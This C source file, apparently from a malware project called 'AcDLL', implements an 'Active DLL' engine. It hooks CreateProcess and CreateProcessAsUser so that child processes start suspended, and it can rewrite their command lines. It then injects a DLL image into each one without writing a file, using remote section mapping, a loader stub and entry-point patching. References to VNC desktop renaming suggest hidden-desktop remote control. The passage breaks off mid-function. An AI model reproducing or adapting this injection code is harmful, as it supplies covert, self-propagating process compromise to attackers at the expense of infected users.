//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// AcDLL project. Version 1.5
//	
// module: activdll.c
// $Revision: 12 $
// $Date: 2012-12-11 16:56:52 +0400 (Вт, 11 дек 2012) $
// description: 
//	Active DLL engine.
//  Injects a specified DLL into every child process that started by a current process.
//  Currently four hooks used: CreateProcess(A and W), CreateProcessAsUser(A and W). This is for creating all processes suspended and 
//   resuming'em after injectin' the DLL.

#include "..\common\common.h"
#include "activdll.h"


#define	PROCESS_WAIT_TIME	6000	// How long we have to wait for a process to initialize (milliseconds)
#define	PROCESS_CHECK_TIME	300		// An interval to check if process already initialized (milliseconds)


LPWSTR	VncChangeDesktopNameW(LPSTARTUPINFOW lpStartupInfo);
LPSTR	VncChangeDesktopNameA(LPSTARTUPINFOA lpStartupInfo);

static AC_CMD_LINE_MODIFY_CALLBACKA g_CmdLineModifyCallbackA;
static AC_CMD_LINE_MODIFY_CALLBACKW g_CmdLineModifyCallbackW;

// --- Globals -------------------------------------------------------------------------------------------------------------


//#define _CALL_IMPORT	TRUE	// Call originally imported function from the IAT, instead of callin saved original pointer.
								// This can fail with CreateProcess hooks on Vista since theese function are being resolved as 
								//  delay import within advapi32.dll

static AD_CONTEXT		g_CurrentAdContext = {0};
static PROCESS_IMPORT	g_DefaultImport = {0};
static PROCESS_IMPORT	g_DefaultImportArch = {0};

// Variables


typedef BOOL (_stdcall* ptr_CreateProcessW)(LPWSTR lpApplicationName,	LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (_stdcall* ptr_CreateProcessA)(PCHAR lpApplicationName,	PCHAR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				PCHAR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (_stdcall* ptr_CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (_stdcall* ptr_CreateProcessAsUserW)(HANDLE hToken, LPWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);



// Predefinitions


WINERROR ProcessInjectDll(LPPROCESS_INFORMATION lpProcessInformation, DWORD	ProcessCreateFlags, ULONG_PTR ProcessEntry, BOOL bInjectImage);


BOOL WINAPI my_CreateProcessW(LPWSTR lpApplicationName,	LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL WINAPI my_CreateProcessA(PCHAR lpApplicationName,	PCHAR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				PCHAR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL WINAPI my_CreateProcessAsUserA(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL WINAPI my_CreateProcessAsUserW(HANDLE hToken, LPWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);


INT CreateInjectThread(ULONG ProcessId);


#ifdef _KERNEL_MODE_INJECT
DECLARE_K32_HOOK(CreateThread);
#else
DECLARE_K32_HOOK(CreateProcessW);
DECLARE_K32_HOOK(CreateProcessA);
DECLARE_A32_HOOK(CreateProcessAsUserW);
DECLARE_A32_HOOK(CreateProcessAsUserA);

//win7
DECLARE_K32_HOOK(CreateProcessAsUserW);
DECLARE_K32_HOOK(CreateProcessAsUserA);
#endif

//////////////////////////////////////////////////////////////////////////

#ifdef _KERNEL_MODE_INJECT
DECLARE_NULL_HOOK(CreateThread);
#else
DECLARE_NULL_HOOK(CreateProcessW);
DECLARE_NULL_HOOK(CreateProcessA);
DECLARE_NULL_HOOK(CreateProcessAsUserW);
DECLARE_NULL_HOOK(CreateProcessAsUserA);
#endif

#define _NO_WND_HOOKS_

// Hook descriptors
static HOOK_DESCRIPTOR ProcIatHooks[] = {

#ifdef	_KERNEL_MODE_INJECT
	DEFINE_K32_IAT_HOOK(CreateThread),
#else
	DEFINE_K32_IAT_HOOK(CreateProcessW),
	DEFINE_K32_IAT_HOOK(CreateProcessA),
	DEFINE_A32_IAT_HOOK(CreateProcessAsUserW),
	DEFINE_A32_IAT_HOOK(CreateProcessAsUserA),
#endif
};

// Hook descriptors
static HOOK_DESCRIPTOR ProcIatHooksEx[] = {

#ifdef _KERNEL_MODE_INJECT
	DEFINE_NULL_IAT_HOOK(CreateThread),
#else
	DEFINE_NULL_IAT_HOOK(CreateProcessW),
	DEFINE_NULL_IAT_HOOK(CreateProcessA),
	DEFINE_NULL_IAT_HOOK(CreateProcessAsUserW),
	DEFINE_NULL_IAT_HOOK(CreateProcessAsUserA),
#endif
};

static HOOK_DESCRIPTOR ProcExportHooks[] = {

#ifdef _KERNEL_MODE_INJECT
	DEFINE_K32_EXP_HOOK(CreateThread),
#else
	DEFINE_K32_EXP_HOOK(CreateProcessW),
	DEFINE_K32_EXP_HOOK(CreateProcessA),
	DEFINE_A32_EXP_HOOK(CreateProcessAsUserW),
	DEFINE_A32_EXP_HOOK(CreateProcessAsUserA),
#endif
};


// Starting form Windows7 CreateProcessAsUserW moved from advapi32 to kernel32
static HOOK_DESCRIPTOR ProcExportHooksEx[] = {

#ifdef _KERNEL_MODE_INJECT
	DEFINE_K32_EXP_HOOK(CreateThread),
#else
	DEFINE_K32_EXP_HOOK(CreateProcessW),
	DEFINE_K32_EXP_HOOK(CreateProcessA),
	DEFINE_K32_EXP_HOOK(CreateProcessAsUserW),
	DEFINE_A32_EXP_HOOK(CreateProcessAsUserA),
#endif
};


//---- Hook functions --------------------------------------------------------------------------------------------------------

#ifndef _KERNEL_MODE_INJECT

BOOL WINAPI my_CreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	ULONG	Flags = dwCreationFlags;
	BOOL	Ret;
	LPWSTR	pNewCmdLine = NULL;

	ENTER_HOOK();

	dwCreationFlags |= CREATE_SUSPENDED;

	if (g_CmdLineModifyCallbackW && (pNewCmdLine = (g_CmdLineModifyCallbackW)(lpApplicationName, lpCommandLine)))
		lpCommandLine = pNewCmdLine;

#ifdef _CALL_IMPORT
	Ret = CreateProcessW(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	ASSERT(hook_kernel32_CreateProcessW.Original);
	Ret = ((ptr_CreateProcessW)hook_kernel32_CreateProcessW.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#endif

	if (Ret)
		ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);

	if (pNewCmdLine)
		AppFree(pNewCmdLine);
	
	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_CreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	ULONG	Flags = dwCreationFlags;
	BOOL	Ret;
	LPSTR	pNewCmdLine = NULL;

	ENTER_HOOK();

	dwCreationFlags |= CREATE_SUSPENDED;

	if (g_CmdLineModifyCallbackA && (pNewCmdLine = (g_CmdLineModifyCallbackA)(lpApplicationName, lpCommandLine)))
		lpCommandLine = pNewCmdLine;

#ifdef _CALL_IMPORT
	Ret = CreateProcessA(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	Ret = ((ptr_CreateProcessA)hook_kernel32_CreateProcessA.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#endif


	if (Ret)
		ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);

	if (pNewCmdLine)
		AppFree(pNewCmdLine);

	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_CreateProcessAsUserA(
	HANDLE hToken,
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	ULONG	Flags = dwCreationFlags;
	BOOL	Ret;

	ENTER_HOOK();

	dwCreationFlags |= CREATE_SUSPENDED;

#ifdef _CALL_IMPORT
	Ret = CreateProcessAsUserA(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	if (LOBYTE(LOWORD(g_SystemVersion)) > 6 || (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) > 0))
	{
		// Win7
		Ret = ((ptr_CreateProcessAsUserA) hook_kernel32_CreateProcessAsUserA.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	else
	{
		Ret = ((ptr_CreateProcessAsUserA) hook_advapi32_CreateProcessAsUserA.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
#endif

	if (Ret)
		ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);

	LEAVE_HOOK();
	return(Ret);
}

BOOL WINAPI my_CreateProcessAsUserW(
	HANDLE hToken,
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{

	ULONG	Flags = dwCreationFlags;
	BOOL	Ret;

	ENTER_HOOK();

	dwCreationFlags |= CREATE_SUSPENDED;

#ifdef _CALL_IMPORT
	Ret = CreateProcessAsUserW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	if (LOBYTE(LOWORD(g_SystemVersion)) > 6 || (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) > 0))
	{
		// Win7
		Ret = ((ptr_CreateProcessAsUserW) hook_kernel32_CreateProcessAsUserW.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	else
	{
		Ret = ((ptr_CreateProcessAsUserW) hook_advapi32_CreateProcessAsUserW.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
#endif

	if (Ret)
		ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);

	LEAVE_HOOK();
	return(Ret);
}
#endif	// _KERNEL_MODE_INJECT

// ---- Functions -----------------------------------------------------------------------------------------------------------



//
//	Writes the specified amount of bytes from the specified buffer into spesified processes memory.
//  Sets PAGE_READWRITE attributes before writing and restores original after it's done.
//
static BOOL PatchProcessMemory(
	HANDLE	hProcess,
	PVOID	Address,
	PCHAR	Patch,
	ULONG	Bytes
	)
{
	BOOL	Ret = FALSE;
	ULONG	OldProtect;
	ULONG_PTR	bWritten;

	if (VirtualProtectEx(hProcess, Address, Bytes, PAGE_READWRITE, &OldProtect))
	{
		if (WriteProcessMemory(hProcess, Address, Patch, Bytes, &bWritten) && bWritten == Bytes)
		{
			ReadProcessMemory(hProcess, Address, &bWritten, sizeof(ULONG_PTR), &bWritten);
			Ret = TRUE;
		}
		VirtualProtectEx(hProcess, Address, Bytes, OldProtect, &OldProtect);
	}

	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns specified process effective entry point address. I.e address where the process starts to execute. 
//	This can be either an address of entry point of the main process image or an address of first image TLS callback if any.
//
static ULONG_PTR	GetProcessEntry(HANDLE	hProcess, ULONG	Flags)
{
	ULONG_PTR	AddressOfCallbacks, TlsCallback, ProcessEntry = 0;
	PCHAR		Buffer;
	PCHAR		ModuleBase;
	SIZE_T		bRead;
	PIMAGE_DATA_DIRECTORY	pDataDir;
	IMAGE_TLS_DIRECTORY		TlsDir;

	do
	{
		if (!(Buffer = AppAlloc(PAGE_SIZE)))
			// Not enough memory
			break;

		// Resolving target process main module image base
		if (!(ModuleBase = PsSupGetProcessMainImageBase(hProcess)))
			break;

		// Calculating and loading image PE header
		if (!ReadProcessMemory(hProcess, ModuleBase, Buffer, PAGE_SIZE, &bRead))
			break;

		if (!ReadProcessMemory(hProcess, ModuleBase + ((PIMAGE_DOS_HEADER)Buffer)->e_lfanew, Buffer, PAGE_SIZE, &bRead))
			break;

		// Calculating process entry VA
		ProcessEntry = (ULONG_PTR)ModuleBase + PeSupGetOptionalField(Buffer, AddressOfEntryPoint);

		// Checking if there's a TLS directory present
		pDataDir = PeSupGetDirectoryEntryPtr(Buffer, IMAGE_DIRECTORY_ENTRY_TLS);

		if (!pDataDir->VirtualAddress || !pDataDir->Size)
			break;

		// Loading TLS directory
		if (!ReadProcessMemory(hProcess, (ModuleBase + pDataDir->VirtualAddress), &TlsDir, sizeof(IMAGE_TLS_DIRECTORY), &bRead))
			break;

#ifdef	_WIN64
		if (Flags & INJECT_WOW64_TARGET)
			AddressOfCallbacks = (ULONG_PTR)((PIMAGE_TLS_DIRECTORY32)&TlsDir)->AddressOfCallBacks;
		else
#endif
		AddressOfCallbacks = (ULONG_PTR)TlsDir.AddressOfCallBacks;

		// Checking if we have TLS callbacks table
		if (!AddressOfCallbacks)
			break;

		// Loading TLS callbacks table
		if (!ReadProcessMemory(hProcess, (PVOID)AddressOfCallbacks, Buffer, PAGE_SIZE, &bRead))
			break;

		// Checking if the table is not empty
		if (TlsCallback = *(PULONG_PTR)Buffer)
			// We have valid TLS callback pointer, this will be our effective entry point
			ProcessEntry = TlsCallback;

	} while(FALSE);

	if (Buffer)
		AppFree(Buffer);

	return(ProcessEntry);
}


//
//	Resolves import and initializes the specified PROCESS_IMPORT structure.
//
static WINERROR InitProcessImport(
	PPROCESS_IMPORT	pImport
	)
{
	WINERROR	Status = NO_ERROR;

	if (!g_DefaultImport.pLdrLoadDll || !g_DefaultImport.pLdrGetProcedureAddress || !g_DefaultImport.pNtProtectVirtualMemory)
	{
		Status = ERROR_PROC_NOT_FOUND;

		do	// not a loop
		{
			HMODULE	hNtdll;
			
			if (!(hNtdll = GetModuleHandleA(szNtdll)))
				break;

			if (!(g_DefaultImport.pLdrLoadDll = (ULONGLONG)PsSupGetRealFunctionAddress(hNtdll, szLdrLoadDll)))
				break;

			if (!(g_DefaultImport.pLdrGetProcedureAddress = (ULONGLONG)PsSupGetRealFunctionAddress(hNtdll, szLdrGetProcedureAddress)))
				break;

			if (!(g_DefaultImport.pNtProtectVirtualMemory = (ULONGLONG)PsSupGetRealFunctionAddress(hNtdll, szZwProtectVirtualMemory)))
				break;

			Status = NO_ERROR;
		} while(FALSE);
	}	// f (!g_DefaultImport.pLdrLoadDll ||

	if (Status == NO_ERROR)
		memcpy(pImport, &g_DefaultImport, sizeof(PROCESS_IMPORT)); 

	return(Status);
}


//
//	Resolves import and initializes the specified PROCESS_IMPORT structure.
//
static WINERROR InitProcessImportArch(
	PPROCESS_IMPORT	pImport,
	HANDLE			hProcess
	)
{
	WINERROR	Status = NO_ERROR;

	if (!g_DefaultImportArch.pLdrLoadDll || !g_DefaultImportArch.pLdrGetProcedureAddress || !g_DefaultImportArch.pNtProtectVirtualMemory)
	{
		Status = ERROR_PROC_NOT_FOUND;

		do	// not a loop
		{
			if (!(g_DefaultImportArch.pLdrLoadDll = (ULONGLONG)PsSupGetProcessFunctionAddressArch(hProcess, szNtdll, szLdrLoadDll)))
				break;

			if (!(g_DefaultImportArch.pLdrGetProcedureAddress = (ULONGLONG)PsSupGetProcessFunctionAddressArch(hProcess, szNtdll, szLdrGetProcedureAddress)))
				break;

			if (!(g_DefaultImportArch.pNtProtectVirtualMemory = (ULONGLONG)PsSupGetProcessFunctionAddressArch(hProcess, szNtdll, szZwProtectVirtualMemory)))
				break;

			Status = NO_ERROR;
		} while(FALSE);
	}	// f (!g_DefaultImportArch.pLdrLoadDll ||

	if (Status == NO_ERROR)
		memcpy(pImport, &g_DefaultImportArch, sizeof(PROCESS_IMPORT)); 

	return(Status);
}


//
//	Injects current DLL image into the target process without creating a file.
//
WINERROR AdInjectImage(
	LPPROCESS_INFORMATION lpProcessInformation,	// Target process and it's main thread information
	PAD_CONTEXT		pAdContext,					// pointer to AD_CONTEXT structure to inject image from
	ULONG			InjectFlags,				// Inject control flags	
	PVOID*			pImageBase					// OPTIONAL: Receives BASE of the newly loaded image
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	PIMAGE_DOS_HEADER	Mz;
	PIMAGE_NT_HEADERS	Pe;
	ULONG	SizeOfImage, SizeOfSection;
	PCHAR	pTargetModule, SectionBase = NULL, RemoteBase = NULL;
	HANDLE	hSection = 0;
	PLOADER_CONTEXT	pLdrCtx, pRemoteCtx;
	PCHAR	pLoaderStub = (PCHAR)&LoadDllStub;

#ifdef _M_AMD64
	if (InjectFlags & INJECT_WOW64_TARGET)
	{
		pLoaderStub = (PCHAR)&LoadDllStubArch;
		pTargetModule = (PCHAR)pAdContext->pModule32;
	}
	else
		pTargetModule = (PCHAR)pAdContext->pModule64;
#else
	if (!(InjectFlags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
	{
		pLoaderStub = (PCHAR)&LoadDllStubArch;
		pTargetModule = (PCHAR)pAdContext->pModule64;
	}
	else
		pTargetModule = (PCHAR)pAdContext->pModule32;
#endif

	do	// not a loop
	{
		if (!pTargetModule)
		{
			DbgPrint("ACTIVDLL_%04x: No module found for the target process (%u) architecture\n", g_CurrentProcessId, lpProcessInformation->dwProcessId);
			Status = ERROR_FILE_NOT_FOUND;
			break;
		}	// if (!pTargetModule)

		Mz = (PIMAGE_DOS_HEADER)pTargetModule;
		Pe = (PIMAGE_NT_HEADERS)((PCHAR)Mz + Mz->e_lfanew);
	
		SizeOfImage = _ALIGN(PeSupGetOptionalField(Pe, SizeOfImage), PAGE_SIZE);
		SizeOfSection = SizeOfImage + sizeof(LOADER_CONTEXT) + pAdContext->Module32Size + pAdContext->Module64Size;

		// Creating a section for the image and mapping it into the current process
		if ((Status = ImgAllocateSection(SizeOfSection, &SectionBase, &hSection)) != NO_ERROR)
		{
			DbgPrint("ACTIVDLL_%04x: Unable to allocate a section of %u bytes, error %u\n", g_CurrentProcessId, SizeOfSection, Status);
			break;
		}
	
		// Mapping the section into the target process
		if ((Status = ImgMapSection(hSection, lpProcessInformation->hProcess, &RemoteBase)) != NO_ERROR)
		{
			DbgPrint("ACTIVDLL_%04x: Unable to map the section into the target process, error %u\n", g_CurrentProcessId, Status);
			break;
		}

		// Building the target image within the section
		if ((Status = AcBuildImage(SectionBase, pTargetModule, RemoteBase)) != NO_ERROR)
		{
			DbgPrint("ACTIVDLL_%04x: Failed buildig the target image, error %u\n", g_CurrentProcessId, Status);
			break;
		}

		// Copying PE-modules into the section
		memcpy(SectionBase + SizeOfImage + sizeof(LOADER_CONTEXT), (PCHAR)pAdContext->pModule32, pAdContext->Module32Size);
		memcpy(SectionBase + SizeOfImage + sizeof(LOADER_CONTEXT) + pAdContext->Module32Size, (PCHAR)pAdContext->pModule64, pAdContext->Module64Size);

		// Initializing loader context
		pLdrCtx = (PLOADER_CONTEXT)(SectionBase + SizeOfImage);
		pLdrCtx->ImageBase = (ULONGLONG)RemoteBase;

		// Initializing ADContext within the loader context
		pLdrCtx->AdContext.pModule32 = (ULONGLONG)(RemoteBase + SizeOfImage + sizeof(LOADER_CONTEXT));
		pLdrCtx->AdContext.pModule64 = (ULONGLONG)(RemoteBase + SizeOfImage + sizeof(LOADER_CONTEXT) + pAdContext->Module32Size);
		pLdrCtx->AdContext.Module32Size = pAdContext->Module32Size;
		pLdrCtx->AdContext.Module64Size = pAdContext->Module64Size;

		// Initializing loader context import

#ifdef _M_AMD64
		if (InjectFlags & INJECT_WOW64_TARGET)
#else
		if (!(InjectFlags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
#endif
			Status = InitProcessImportArch(&pLdrCtx->Import, lpProcessInformation->hProcess);
		else
			Status = InitProcessImport(&pLdrCtx->Import);

		if (Status != NO_ERROR)
		{
			DbgPrint("ACTIVDLL_%04x: Unable to resolve target process import, error %u\n", g_CurrentProcessId, Status);
			break;
		}

#if _DEBUG
		// Some function addresses in DEBUG build could be addresses of JMPs to real functions.
		// Calculating real stub address here.
		if (*(PUCHAR)pLoaderStub == OP_JMP_NEAR) 
			pLoaderStub = (PVOID)((ULONG_PTR)pLoaderStub + *(PULONG)((PCHAR)pLoaderStub + sizeof(UCHAR)) + 5);
#endif
	
		memcpy(&pLdrCtx->LoaderStub, pLoaderStub, LOADER_STUB_MAX);
		pRemoteCtx = (PLOADER_CONTEXT)(RemoteBase + SizeOfImage);

		// Executing loader stub function within the target process
		Status = PsSupExecuteRemoteFunction(lpProcessInformation, &pRemoteCtx->LoaderStub, pRemoteCtx, InjectFlags);

		if ((Status == NO_ERROR) && pImageBase)
			*pImageBase = RemoteBase;
	
	}	while(FALSE);

	if (SectionBase)
		ImgUnmapSection(NtCurrentProcess(), SectionBase);

	if (hSection)
		CloseHandle(hSection);

	return(Status);
}


#ifndef	_WIN64
// WOW64-only functions


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Writes specified amount of bytes from the specified buffer into spesified processes memory.
//  Sets PAGE_READWRITE attributes before writing and restores original after it's done.
//
static BOOL Wow64PatchProcessMemory64(
						HANDLE		hProcess,
						ULONGLONG	Address,
						PCHAR		Patch,
						ULONG		Bytes
						)
{
	BOOL	Ret = FALSE;
	NTSTATUS	ntStatus;

	ULONGLONG	bWritten, OldProtect, ProtAddress = Address, ProtBytes = Bytes, WriteBytes = Bytes;
	ULONGLONG	pZwProtectVirtualMemory = PsSupGetProcessFunctionAddressArch(GetCurrentProcess(), szNtdll, szZwProtectVirtualMemory);
	ULONGLONG	pZwWriteVirtualMemory = PsSupGetProcessFunctionAddressArch(GetCurrentProcess(), szNtdll, szZwWriteVirtualMemory);

	if (pZwProtectVirtualMemory && pZwWriteVirtualMemory)
	{
		ntStatus = Wow64NativeCall(pZwProtectVirtualMemory, 5, (ULONG64)hProcess, (ULONG64)&ProtAddress, (ULONG64)&ProtBytes, (ULONG64)PAGE_READWRITE, (ULONG64)&OldProtect);
		if (NT_SUCCESS(ntStatus))
		{
			ntStatus = Wow64NativeCall(pZwWriteVirtualMemory, 5, (ULONG64)hProcess, (ULONG64)Address, (ULONG64)Patch, (ULONG64)Bytes, (ULONG64)&bWritten);
			if (NT_SUCCESS(ntStatus))
				Ret = TRUE;
			Wow64NativeCall(pZwProtectVirtualMemory, 5, (ULONG64)hProcess, (ULONG64)&ProtAddress, (ULONG64)&ProtBytes, (ULONG64)OldProtect, (ULONG64)&OldProtect);
		}
	}
	return(Ret);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns specified process effective entry point address. I.e address where the process starts to execute. 
//	This can be either an address of entry point of the main process image or an address of first image TLS callback if any.
//
static NTSTATUS	Wow64GetProcessEntry64(HANDLE hProcess, ULONGLONG* pProcessEntry)
{
	ULONGLONG	ModuleBase, TlsCallback, ProcessEntry = 0;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PCHAR		Buffer;
	SIZE_T		bRead;
	PIMAGE_DATA_DIRECTORY	pDataDir;
	IMAGE_TLS_DIRECTORY		TlsDir;

	do 
	{
		if (!(Buffer = AppAlloc(PAGE_SIZE)))
		// Not enough memory
			break;

		ntStatus = PsSupGetProcessMainImageBaseArch(hProcess, &ModuleBase);
		if (!NT_SUCCESS(ntStatus))
			break;

		if (!PsSupReadProcessMemoryArch(hProcess, ModuleBase, Buffer, PAGE_SIZE, &bRead))
			break;

		if (!PsSupReadProcessMemoryArch(hProcess, ModuleBase + ((PIMAGE_DOS_HEADER)Buffer)->e_lfanew, Buffer, PAGE_SIZE, &bRead))
			break;

		ProcessEntry = ModuleBase + PeSupGetOptionalField(Buffer, AddressOfEntryPoint);

		pDataDir = PeSupGetDirectoryEntryPtr(Buffer, IMAGE_DIRECTORY_ENTRY_TLS);

		if (!pDataDir->VirtualAddress || !pDataDir->Size)
			break;

		if (!PsSupReadProcessMemoryArch(hProcess, (ModuleBase + pDataDir->VirtualAddress), &TlsDir, sizeof(IMAGE_TLS_DIRECTORY), &bRead))
			break;

		if (!TlsDir.AddressOfCallBacks)
			break;

		// Image has TLS callbacks
		if (!PsSupReadProcessMemoryArch(hProcess, (ULONGLONG)(ULONG_PTR)TlsDir.AddressOfCallBacks, Buffer, PAGE_SIZE, &bRead))
			break;

		if (TlsCallback = *(ULONGLONG*)Buffer)
			ProcessEntry = TlsCallback;

	} while(FALSE);

	*pProcessEntry = ProcessEntry;

	if (Buffer)
		AppFree(Buffer);

	return(ntStatus);
}


//
//	Injects a 64-bit native DLL into a 64-bit native process from a WOW64 process.
//
static	WINERROR Wow64ProcessInjectDll64(
	LPPROCESS_INFORMATION lpProcessInformation, 
	LPTSTR	DllPath,
	BOOL	bInjectImage	
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	ULONG		Orig, Patch = 0xCCCCFEEB;
	CONTEXT64	Ctx64 = {0};
	ULONG_PTR	bRead;
	ULONGLONG	Oep;
	PPSSUP_NATIVE_POINTERS	Wow64CallPointers = PsSupResolveNativePointers();

	Ctx64.ContextFlags = _CONTEXT_AMD64 | _CONTEXT_CONTROL | _CONTEXT_INTEGER;

	if (NT_SUCCESS(Wow64GetProcessEntry64(lpProcessInformation->hProcess, &Oep)))
	{
		// Saving original OEP bytes
		if (PsSupReadProcessMemoryArch(lpProcessInformation->hProcess, Oep, &Orig, sizeof(ULONG), &bRead) && bRead == sizeof(ULONG))
		{
			// Writing infinitive loop to OEP
			if (Wow64PatchProcessMemory64(lpProcessInformation->hProcess, Oep, (PCHAR)&Patch, sizeof(ULONG)))
